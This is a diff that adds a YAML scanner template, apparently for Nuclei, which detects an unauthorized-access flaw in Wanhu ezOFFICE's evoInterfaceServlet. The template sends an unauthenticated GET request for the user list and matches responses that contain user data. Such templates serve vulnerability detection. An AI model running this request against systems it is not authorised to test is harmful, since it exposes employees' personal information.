@@ -1,0 +1,25 @@
+id: poc-yaml-wan-hu-ezoffice-evointerfaceservlet-unauthorized-access
+
+info:
+  name: Wanhu ezOFFICE evoInterfaceServlet Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    Wanhu ezOFFICE evoInterfaceServlet is vulnerable to unauthorized access, allowing disclosure of sensitive information like user lists.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/evoInterfaceServlet?paramType=user"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+          - "userList"
+          - "普通员工"
+        part: body
